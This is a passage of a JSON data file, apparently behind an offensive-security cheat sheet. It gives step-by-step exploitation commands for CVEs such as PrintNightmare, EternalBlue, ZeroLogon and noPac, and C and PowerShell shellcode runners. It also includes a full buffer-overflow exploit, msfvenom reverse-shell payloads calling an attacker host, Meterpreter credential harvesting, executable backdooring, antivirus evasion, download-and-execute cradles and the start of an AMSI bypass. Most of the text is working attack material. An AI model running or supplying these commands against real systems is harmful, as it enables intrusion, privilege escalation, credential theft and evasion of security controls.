                    "# If it crashes/segfaults = vulnerable",
                    "# If it shows usage = patched",
                    "sudo --version"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "git clone https://github.com/blasty/CVE-2021-3156",
                    "cd CVE-2021-3156",
                    "make",
                    "./sudo-hax-me-a-sandwich <target-id>",
                    "# target-id depends on OS (0=Ubuntu 18.04, 1=Ubuntu 20.04, etc.)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-5",
          "name": "CVE-2021-1675 / CVE-2021-34527 — PrintNightmare",
          "description": "Type: Remote Code Execution / Local Privilege Escalation<br>Affected: Windows Print Spooler service (all versions prior to July 2021 patch)<br>CVSS: 8.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "# Check if Print Spooler is running",
                    "rpcdump.py @<TARGET-IP> | grep -i spooler"
                  ]
                },
                {
                  "cmd": [
                    "# Or via PowerShell on target",
                    "Get-Service Spooler"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit (Remote — requires domain credentials)",
              "entries": [
                {
                  "cmd": [
                    "# Generate malicious DLL",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f dll -o evil.dll",
                    "",
                    "# Host the DLL on SMB share",
                    "smbserver.py share . -smb2support",
                    "",
                    "# Execute PrintNightmare",
                    "python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET-IP> '\\\\<ATTACKER-IP>\\share\\evil.dll'"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit (Local Privilege Escalation)",
              "entries": [
                {
                  "cmd": [
                    "# PowerShell version — adds a local admin user",
                    "Import-Module .\\CVE-2021-1675.ps1",
                    "Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"P@ssw0rd123!\"",
                    "# Adds user 'hacker' to local Administrators group"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-6",
          "name": "CVE-2017-0144 — EternalBlue (MS17-010)",
          "description": "Type: Remote Code Execution<br>Affected: Windows Vista/7/8.1, Server 2008/2012/2016 — SMBv1<br>CVSS: 9.8 (Critical)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "nmap --script smb-vuln-ms17-010 -p 445 <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "# Metasploit",
                    "use exploit/windows/smb/ms17_010_eternalblue",
                    "set RHOSTS <TARGET-IP>",
                    "set LHOST <ATTACKER-IP>",
                    "set PAYLOAD windows/x64/shell_reverse_tcp",
                    "run",
                    "",
                    "# Manual (AutoBlue)",
                    "git clone https://github.com/3ndG4me/AutoBlue-MS17-010",
                    "cd AutoBlue-MS17-010/shellcode",
                    "./shell_prep.sh   # Enter LHOST, LPORT",
                    "cd ..",
                    "python3 eternalblue_exploit7.py <TARGET-IP> shellcode/sc_all.bin"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-7",
          "name": "CVE-2021-36934 — HiveNightmare / SeriousSAM",
          "description": "Type: Local Privilege Escalation<br>Affected: Windows 10 versions 1809+, Windows 11<br>CVSS: 7.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "icacls C:\\Windows\\System32\\config\\SAM",
                    "REM Look for BUILTIN\\Users having read access"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "REM Copy shadow copies",
                    "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM",
                    "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM"
                  ]
                },
                {
                  "cmd": [
                    "# Transfer to attacker, then extract hashes",
                    "secretsdump.py -sam SAM -system SYSTEM LOCAL"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-8",
          "name": "CVE-2020-1472 — ZeroLogon (Netlogon Privilege Escalation)",
          "description": "Type: Domain Privilege Escalation<br>Affected: Windows Server 2008–2019 (Domain Controllers)<br>CVSS: 10.0 (Critical)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "python3 zerologon_tester.py <DC-NETBIOS-NAME> <DC-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "# Reset DC machine account password to empty",
                    "python3 cve-2020-1472-exploit.py <DC-NETBIOS-NAME> <DC-IP>",
                    "",
                    "# Now dump hashes with empty password",
                    "secretsdump.py -no-pass -just-dc <DOMAIN>/<DC-NETBIOS-NAME>\\$@<DC-IP>",
                    "",
                    "# Use Domain Admin hash for pass-the-hash",
                    "psexec.py -hashes <LM>:<NT> <DOMAIN>/Administrator@<DC-IP>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-9",
          "name": "CVE-2019-18634 — Sudo Buffer Overflow (pwfeedback)",
          "description": "Type: Local Privilege Escalation<br>Affected: Sudo \\< 1.8.26 (with pwfeedback enabled)<br>CVSS: 7.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "sudo -l    # Check for pwfeedback in Defaults",
                    "cat /etc/sudoers | grep pwfeedback",
                    "sudo --version   # Must be < 1.8.26"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "git clone https://github.com/saleemrashid/sudo-cve-2019-18634",
                    "cd sudo-cve-2019-18634",
                    "make",
                    "./exploit"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-10",
          "name": "CVE-2019-14287 — Sudo User ID Bypass",
          "description": "Type: Local Privilege Escalation<br>Affected: Sudo \\< 1.8.28<br>CVSS: 8.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "sudo -l",
                    "# Look for: (ALL, !root) /bin/bash"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "sudo -u#-1 /bin/bash",
                    "# or",
                    "sudo -u#4294967295 /bin/bash"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-11",
          "name": "noPac / samAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)",
          "description": "Impact: Any domain user → Domain Admin. Exploits a flaw in how AD handles machine account names during Kerberos authentication. One of the most impactful AD privesc CVEs. Requirements: Any valid domain user credentials. The domain must allow regular users to create machine accounts (default: MachineAccountQuota = 10).",
          "commands": [
            {
              "desc": "Check",
              "entries": [
                {
                  "cmd": [
                    "# Check MachineAccountQuota (if > 0, exploit is possible)",
                    "nxc ldap <DC-IP> -u <USER> -p <PASS> -M maq",
                    "",
                    "# Or with ldapsearch",
                    "ldapsearch -x -H ldap://<DC-IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b \"DC=domain,DC=com\" \"(objectClass=domain)\" ms-DS-MachineAccountQuota"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "# Using noPac.py (automated)",
                    "# Install: git clone https://github.com/Ridter/noPac.git",
                    "python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -shell --impersonate Administrator -use-ldap",
                    "",
                    "# Manual steps with Impacket:",
                    "# 1. Create a machine account",
                    "impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name 'NOPAC$' -computer-pass 'Password123' -dc-ip <DC-IP>",
                    "",
                    "# 2. Clear the SPN on the new machine account",
                    "impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name 'NOPAC$' -computer-pass 'Password123' -dc-ip <DC-IP> -no-add",
                    "",
                    "# 3. Rename machine account to match DC name (without the $)",
                    "# 4. Request TGT as the spoofed DC name",
                    "# 5. Rename back to original",
                    "# 6. Request TGS using the TGT — AD issues a ticket for the real DC account",
                    "",
                    "# DCSync with the obtained ticket",
                    "impacket-secretsdump <DOMAIN>/Administrator@<DC-IP> -k -no-pass"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-12",
          "name": "PrintNightmare — Local Privilege Escalation (CVE-2021-1675)",
          "description": "Impact: Local user → SYSTEM. The LPE variant of PrintNightmare allows a local user to load a malicious DLL through the Print Spooler service. Separate from the RCE variant (CVE-2021-34527) already listed. Requirements: Print Spooler service running, user has local access.",
          "commands": [
            {
              "desc": "Check",
              "entries": [
                {
                  "cmd": [
                    "# Check if Print Spooler is running",
                    "Get-Service -Name Spooler",
                    "",
                    "# Check for the vulnerable DLL",
                    "Get-Item \"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\mxdwdrv.dll\""
                  ]
                }
              ]
            },
            {
              "desc": "Exploit (LPE)",
              "entries": [
                {
                  "cmd": [
                    "# Generate a DLL payload",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o exploit.dll",
                    "",
                    "# Host the DLL on an SMB share",
                    "impacket-smbserver share . -smb2support",
                    "",
                    "# On target — load the malicious DLL via Print Spooler",
                    "# Use SharpPrintNightmare or the PowerShell exploit:",
                    "Import-Module .\\CVE-2021-1675.ps1",
                    "Invoke-Nightmare -DLL \"\\\\<ATTACKER-IP>\\share\\exploit.dll\"",
                    "",
                    "# Alternative: add a local admin user",
                    "Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"Password123!\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-13",
          "name": "searchsploit / ExploitDB Workflow",
          "description": "When to use: After identifying a service version via Nmap or manual enumeration. searchsploit searches the local ExploitDB database for known exploits.",
          "commands": [
            {
              "desc": "searchsploit / ExploitDB Workflow",
              "entries": [
                {
                  "subdesc": "When to use: After identifying a service version via Nmap or manual enumeration. searchsploit searches the local ExploitDB database for known exploits.",
                  "cmd": [
                    "# Basic search by service name and version",
                    "searchsploit apache 2.4.49",
                    "searchsploit openssh 7.2",
                    "searchsploit wordpress 5.0",
                    "",
                    "# Search by CVE number",
                    "searchsploit CVE-2021-3156",
                    "",
                    "# Narrow results with multiple terms",
                    "searchsploit \"microsoft iis\" \"remote code\"",
                    "",
                    "# Copy an exploit to current directory",
                    "searchsploit -m <EXPLOIT-ID>",
                    "# Example: searchsploit -m 49757",
                    "",
                    "# View exploit details without copying",
                    "searchsploit -x <EXPLOIT-ID>",
                    "",
                    "# Update the database",
                    "searchsploit -u"
                  ]
                }
              ]
            },
            {
              "desc": "Workflow",
              "entries": [
                {
                  "cmd": [
                    "1. Identify service + version number (Nmap -sV)",
                    "2. searchsploit <service> <version>",
                    "3. Read the exploit code (-x) before running it",
                    "4. Check for any modifications needed (target IP, port, paths)",
                    "5. Copy to working directory (-m) and modify",
                    "6. Test in a controlled way"
                  ]
                }
              ]
            },
            {
              "desc": "Key ExploitDB Tips",
              "entries": [
                {
                  "cmd": [
                    "- Exploits ending in .py, .rb, .c may need compilation or dependencies",
                    "- Always read the source code — understand what it does",
                    "- Check for \"Proof of Concept\" vs \"Functional Exploit\" in the description",
                    "- Cross-reference with GitHub for updated/working versions",
                    "- Many ExploitDB entries are outdated — check comments/mirrors"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-14",
          "name": "Windows API Fundamentals for Shellcode",
          "description": "Windows shellcode development relies on key Win32 API functions:",
          "commands": [
            {
              "desc": "Basic Shellcode Runner (C)",
              "entries": [
                {
                  "cmd": [
                    "#include <windows.h>",
                    "#include <stdio.h>",
                    "",
                    "// msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c",
                    "unsigned char shellcode[] = \"\\xfc\\x48\\x83\\xe4...\";",
                    "",
                    "int main() {",
                    "    // Allocate RWX memory",
                    "    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);",
                    "    ",
                    "    // Copy shellcode to allocated memory",
                    "    memcpy(exec, shellcode, sizeof(shellcode));",
                    "    ",
                    "    // Create thread to execute shellcode",
                    "    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);",
                    "    ",
                    "    // Wait for thread to finish",
                    "    WaitForSingleObject(hThread, INFINITE);",
                    "    ",
                    "    return 0;",
                    "}"
                  ]
                }
              ]
            },
            {
              "desc": "PowerShell Shellcode Runner (Reflection)",
              "entries": [
                {
                  "cmd": [
                    "# Load shellcode into memory using .NET reflection (fileless execution)",
                    "$code = @\"",
                    "using System;",
                    "using System.Runtime.InteropServices;",
                    "public class Win32 {",
                    "    [DllImport(\"kernel32\")]",
                    "    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
                    "    [DllImport(\"kernel32\")]",
                    "    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
                    "    [DllImport(\"kernel32\")]",
                    "    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);",
                    "}",
                    "\"@",
                    "",
                    "Add-Type $code",
                    "",
                    "# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f ps1",
                    "[Byte[]] $buf = 0xfc,0x48,0x83,0xe4...",
                    "",
                    "$size = $buf.Length",
                    "$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40)",
                    "[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)",
                    "$hThread = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)",
                    "[Win32]::WaitForSingleObject($hThread, 0xFFFFFFFF)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-15",
          "name": "Buffer Overflow Exploitation",
          "description": "Buffer Overflow Exploitation",
          "commands": [
            {
              "desc": "Step 1: Spiking — Identify Vulnerable Input",
              "entries": [
                {
                  "subdesc": "Use generic_send_tcp or custom scripts to send increasing amounts of data to each input parameter:",
                  "cmd": [
                    "# Create a spike template (test.spk)",
                    "s_readline();",
                    "s_string(\"TRUN \");",
                    "s_string_variable(\"FUZZ\");",
                    "",
                    "# Run the spiker",
                    "generic_send_tcp <TARGET-IP> <PORT> test.spk 0 0"
                  ]
                }
              ]
            },
            {
              "desc": "Step 2: Fuzzing — Determine Crash Length",
              "entries": [
                {
                  "cmd": [
                    "import sys",
                    "import socket",
                    "",
                    "target_ip = \"<TARGET-IP>\"",
                    "target_port = <PORT>",
                    "buffer_size = 100",
                    "increment = 100",
                    "",
                    "while True:",
                    "    try:",
                    "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
                    "        s.settimeout(5)",
                    "        s.connect((target_ip, target_port))",
                    "        s.recv(1024)",
                    "        ",
                    "        payload = b\"TRUN /.:/\" + b\"A\" * buffer_size",
                    "        s.send(payload)",
                    "        s.close()",
                    "        ",
                    "        print(f\"[+] Sent {buffer_size} bytes\")",
                    "        buffer_size += increment",
                    "    except:",
                    "        print(f\"[!] Crashed at {buffer_size} bytes\")",
                    "        break"
                  ]
                }
              ]
            },
            {
              "desc": "Step 3: Find Exact Offset",
              "entries": [
                {
                  "cmd": [
                    "# Generate a unique pattern",
                    "msf-pattern_create -l <CRASH-LENGTH>",
                    "",
                    "# After crash, find EIP offset using the value in EIP register",
                    "msf-pattern_offset -l <CRASH-LENGTH> -q <EIP-VALUE>",
                    "",
                    "# Mona alternative (in Immunity Debugger)",
                    "!mona findmsp -distance <CRASH-LENGTH>"
                  ]
                }
              ]
            },
            {
              "desc": "Step 4: Confirm EIP Control",
              "entries": [
                {
                  "cmd": [
                    "import sys",
                    "import socket",
                    "",
                    "offset = <EXACT-OFFSET>  # From pattern_offset",
                    "eip = b\"BBBB\"  # Should see 42424242 in EIP",
                    "",
                    "payload = b\"A\" * offset + eip + b\"C\" * (crash_length - offset - 4)",
                    "",
                    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
                    "s.connect((\"<TARGET-IP>\", <PORT>))",
                    "s.send(b\"TRUN /.:/\" + payload)",
                    "s.close()"
                  ]
                }
              ]
            },
            {
              "desc": "Step 5: Find Bad Characters",
              "entries": [
                {
                  "cmd": [
                    "# Generate all possible bytes (0x00-0xFF) excluding 0x00 (always bad)",
                    "badchars = bytearray(range(1, 256))",
                    "",
                    "# Send with the payload and compare in memory dump",
                    "# Remove any byte that corrupts the sequence",
                    "# Common bad chars: \\x00 \\x0a \\x0d \\x25 \\x2b"
                  ]
                },
                {
                  "subdesc": "In Immunity Debugger:",
                  "cmd": [
                    "!mona bytearray -b \"\\x00\"",
                    "# After crash:",
                    "!mona compare -f C:\\mona\\<APP>\\bytearray.bin -a <ESP-ADDRESS>"
                  ]
                }
              ]
            },
            {
              "desc": "Step 6: Find JMP ESP",
              "entries": [
                {
                  "cmd": [
                    "# In Immunity Debugger with Mona",
                    "!mona jmp -r esp -cpb \"\\x00\"  # -cpb excludes bad chars",
                    "",
                    "# Returns addresses of JMP ESP instructions in loaded modules",
                    "# Choose an address from a module WITHOUT ASLR, DEP, SafeSEH"
                  ]
                }
              ]
            },
            {
              "desc": "Step 7: Generate Shellcode and Exploit",
              "entries": [
                {
                  "cmd": [
                    "# Generate shellcode excluding bad characters",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -b '\\x00' -f python -v shellcode EXITFUNC=thread"
                  ]
                },
                {
                  "cmd": [
                    "import sys",
                    "import socket",
                    "import struct",
                    "",
                    "target_ip = \"<TARGET-IP>\"",
                    "target_port = <PORT>",
                    "offset = <OFFSET>",
                    "jmp_esp = struct.pack(\"<I\", 0x<JMP-ESP-ADDRESS>)  # Little-endian",
                    "nop_sled = b\"\\x90\" * 16  # NOP sled for reliability",
                    "",
                    "# msfvenom shellcode here",
                    "shellcode = b\"\\xda\\xc1\\xd9\\x74...\"  ",
                    "",
                    "payload = b\"A\" * offset + jmp_esp + nop_sled + shellcode",
                    "",
                    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
                    "s.connect((target_ip, target_port))",
                    "s.send(b\"TRUN /.:/\" + payload)",
                    "s.close()",
                    "print(\"[+] Exploit sent!\")"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-16",
          "name": "Metasploit Framework (msfconsole)",
          "description": "Metasploit Framework (msfconsole)",
          "commands": [
            {
              "desc": "Initial Setup",
              "entries": [
                {
                  "cmd": [
                    "# Start PostgreSQL database (required for workspaces)",
                    "sudo systemctl start postgresql",
                    "sudo msfdb init",
                    "",
                    "# Launch Metasploit",
                    "msfconsole -q"
                  ]
                }
              ]
            },
            {
              "desc": "Workspace Management",
              "entries": [
                {
                  "cmd": [
                    "# Create a new workspace for the engagement",
                    "workspace -a <PROJECT-NAME>",
                    "",
                    "# List workspaces",
                    "workspace",
                    "",
                    "# Switch workspace",
                    "workspace <NAME>",
                    "",
                    "# Delete workspace",
                    "workspace -d <NAME>"
                  ]
                }
              ]
            },
            {
              "desc": "Module Usage",
              "entries": [
                {
                  "cmd": [
                    "# Search for exploits",
                    "search type:exploit name:eternalblue",
                    "search type:exploit platform:windows smb",
                    "search cve:2021-44228",
                    "",
                    "# Use an exploit",
                    "use exploit/windows/smb/ms17_010_eternalblue",
                    "",
                    "# Show options and required fields",
                    "show options",
                    "show payloads",
                    "",
                    "# Set options",
                    "set RHOSTS <TARGET-IP>",
                    "set LHOST <ATTACKER-IP>",
                    "set LPORT <PORT>",
                    "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                    "",
                    "# Run the exploit",
                    "exploit",
                    "# OR",
                    "run"
                  ]
                }
              ]
            },
            {
              "desc": "Auxiliary Modules (Scanning & Recon)",
              "entries": [
                {
                  "cmd": [
                    "# Port scan",
                    "use auxiliary/scanner/portscan/tcp",
                    "set RHOSTS <TARGET-SUBNET>/24",
                    "set THREADS 50",
                    "run",
                    "",
                    "# SMB version detection",
                    "use auxiliary/scanner/smb/smb_version",
                    "set RHOSTS <TARGET-IP>",
                    "run",
                    "",
                    "# HTTP directory scanner",
                    "use auxiliary/scanner/http/dir_scanner",
                    "set RHOSTS <TARGET-IP>",
                    "run",
                    "",
                    "# SMB login brute-force",
                    "use auxiliary/scanner/smb/smb_login",
                    "set RHOSTS <TARGET-IP>",
                    "set USER_FILE /usr/share/wordlists/users.txt",
                    "set PASS_FILE /usr/share/wordlists/rockyou.txt",
                    "run"
                  ]
                }
              ]
            },
            {
              "desc": "Meterpreter Post-Exploitation Commands",
              "entries": [
                {
                  "cmd": [
                    "# System info",
                    "sysinfo",
                    "getuid",
                    "getpid",
                    "",
                    "# Privilege escalation",
                    "getsystem",
                    "",
                    "# Process migration (migrate to a stable SYSTEM process)",
                    "ps",
                    "migrate <PID>",
                    "",
                    "# Credential harvesting",
                    "hashdump",
                    "load kiwi",
                    "creds_all",
                    "",
                    "# File operations",
                    "download C:\\\\Users\\\\Admin\\\\Desktop\\\\secrets.txt /tmp/",
                    "upload /tmp/backdoor.exe C:\\\\Windows\\\\Temp\\\\",
                    "",
                    "# Pivoting",
                    "run autoroute -s <INTERNAL-SUBNET>/24",
                    "run post/multi/manage/autoroute",
                    "",
                    "# Port forwarding",
                    "portfwd add -l <LOCAL-PORT> -p <REMOTE-PORT> -r <TARGET-IP>",
                    "",
                    "# Background session",
                    "background",
                    "sessions -l",
                    "sessions -i <ID>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-17",
          "name": "MSFvenom — Payload Generation",
          "description": "MSFvenom — Payload Generation",
          "commands": [
            {
              "desc": "Listing Available Options",
              "entries": [
                {
                  "cmd": [
                    "# List all payloads",
                    "msfvenom -l payloads",
                    "",
                    "# List all encoders",
                    "msfvenom -l encoders",
                    "",
                    "# List output formats",
                    "msfvenom -l formats",
                    "",
                    "# List platforms",
                    "msfvenom -l platforms"
                  ]
                }
              ]
            },
            {
              "desc": "Windows Payloads",
              "entries": [
                {
                  "cmd": [
                    "# Windows staged reverse TCP (smaller, needs handler)",
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o shell.exe",
                    "",
                    "# Windows stageless reverse TCP (self-contained, more stable)",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o shell.exe",
                    "",
                    "# 64-bit Windows meterpreter",
                    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o shell64.exe",
                    "",
                    "# Windows DLL payload (for DLL hijacking)",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f dll -o malicious.dll",
                    "",
                    "# Windows Service Binary (for service hijacking)",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe-service -o svc_shell.exe",
                    "",
                    "# PowerShell payload",
                    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f psh -o shell.ps1",
                    "",
                    "# VBA macro payload",
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f vba -o macro.vba",
                    "",
                    "# HTA payload",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f hta-psl -o evil.hta"
                  ]
                }
              ]
            },
            {
              "desc": "Linux Payloads",
              "entries": [
                {
                  "cmd": [
                    "# Linux staged meterpreter",
                    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f elf -o shell.elf",
                    "",
                    "# Linux stageless reverse shell",
                    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f elf -o shell.elf",
                    "",
                    "# Linux shared object (for LD_PRELOAD hijacking)",
                    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f elf-so -o malicious.so"
                  ]
                }
              ]
            },
            {
              "desc": "Web Payloads",
              "entries": [
                {
                  "cmd": [
                    "# PHP reverse shell",
                    "msfvenom -p php/reverse_php LHOST=<ATTACKER-IP> LPORT=<PORT> -o shell.php",
                    "",
                    "# JSP reverse shell",
                    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -o shell.jsp",
                    "",
                    "# WAR file (for Tomcat)",
                    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f war -o shell.war",
                    "",
                    "# ASP reverse shell",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f asp -o shell.asp",
                    "",
                    "# Python reverse shell",
                    "msfvenom -p python/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -o shell.py"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-18",
          "name": "Multi/Handler Setup",
          "description": "Multi/Handler Setup",
          "commands": [
            {
              "desc": "Multi/Handler Setup",
              "entries": [
                {
                  "cmd": [
                    "# Set up handler for staged payload",
                    "use exploit/multi/handler",
                    "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                    "set LHOST <ATTACKER-IP>",
                    "set LPORT <PORT>",
                    "set ExitOnSession false",
                    "exploit -j",
                    "# -j runs in background as a job"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-19",
          "name": "On-Disk Evasion",
          "description": "Payloads written to disk must avoid signature detection.",
          "commands": [
            {
              "desc": "MSFvenom Encoding",
              "entries": [
                {
                  "subdesc": "Quick but low success rate. Encoding alone rarely bypasses modern AV. Use as a starting point, then move to Shellter/Veil/custom loaders.",
                  "cmd": [
                    "# Basic encoding (low evasion rate)",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x64/zutto_dekiru -i 10 -o encoded.exe",
                    "",
                    "# Multiple encoding iterations",
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 15 -f raw | \\",
                    "msfvenom -e x86/alpha_mixed -i 5 -f exe -o multi_encoded.exe",
                    "",
                    "# Embed in legitimate executable (backdoor an installer)",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /path/to/legit.exe -k -f exe -o backdoored.exe"
                  ]
                }
              ]
            },
            {
              "desc": "Shellter (PE Backdooring)",
              "entries": [
                {
                  "subdesc": "Best for quick basic AV evasion. Injects shellcode into legitimate 32-bit PE executables. Works well against Windows Defender. Use a commonly trusted executable (e.g., putty.exe, WinSCP.exe).",
                  "cmd": [
                    "# Interactive mode",
                    "shellter",
                    "",
                    "# Follow prompts:",
                    "# PE Target: /path/to/legit_32bit.exe",
                    "# Stealth Mode: Y",
                    "# Payload: Custom or Listed",
                    "# For custom: provide raw shellcode file",
                    "# For listed: select payload and set LHOST/LPORT"
                  ]
                }
              ]
            },
            {
              "desc": "Veil Framework",
              "entries": [
                {
                  "subdesc": "Automated evasion framework. Generates payloads in multiple languages (Python, C, PowerShell) with built-in obfuscation. Install: apt install veil.",
                  "cmd": [
                    "# Launch Veil",
                    "veil",
                    "",
                    "# Use Evasion",
                    "use 1  # Evasion module",
                    "list   # List available payloads",
                    "",
                    "# Example: Python reverse shell",
                    "use python/meterpreter/rev_tcp.py",
                    "set LHOST <ATTACKER-IP>",
                    "set LPORT <PORT>",
                    "generate"
                  ]
                }
              ]
            },
            {
              "desc": "Donut (Shellcode Converter)",
              "entries": [
                {
                  "subdesc": "Convert any .NET/PE binary into injectable shellcode. Useful for running tools like Rubeus or SharpHound entirely in memory. Install: pip3 install donut-shellcode. Converts .NET assemblies, PE files, and DLLs into position-independent shellcode:",
                  "cmd": [
                    "# Convert .NET assembly to shellcode",
                    "donut -f /path/to/payload.exe -o shellcode.bin",
                    "",
                    "# With specific parameters",
                    "donut -f Rubeus.exe -a 2 -p \"kerberoast\" -o rubeus_shellcode.bin",
                    "# -a 2 = x64 architecture",
                    "# -p = arguments to pass to the executable",
                    "",
                    "# Then inject shellcode using a custom loader"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-20",
          "name": "In-Memory Evasion (Fileless Execution)",
          "description": "Execute payloads directly in memory without touching disk.",
          "commands": [
            {
              "desc": "PowerShell Download Cradles",
              "entries": [
                {
                  "subdesc": "Fileless execution — payload never touches disk. These download and execute scripts directly in memory. AMSI will still scan the content, so bypass AMSI first (see below).",
                  "cmd": [
                    "# IEX download and execute (classic, detected by AMSI)",
                    "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/payload.ps1')",
                    "",
                    "# Using .NET WebClient with stream reader",
                    "$sr = New-Object IO.StreamReader((New-Object Net.WebClient).OpenRead('http://<IP>/payload.ps1'))",
                    "IEX $sr.ReadToEnd()",
                    "",
                    "# Using Invoke-RestMethod",
                    "IEX(Invoke-RestMethod -Uri 'http://<IP>/payload.ps1')"
                  ]
                }
              ]
            },
            {
              "desc": "AMSI Bypass (Required Before Running PowerShell Payloads)",
              "entries": [
                {
                  "subdesc": "CRITICAL: Run an AMSI bypass BEFORE any PowerShell payload. AMSI scans all PowerShell, .NET, and VBA content at runtime. Without bypassing it, download cradles and reverse shells will be caught.",
                  "cmd": [
                    "# Classic AMSI bypass (patch AmsiScanBuffer)",
                    "$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
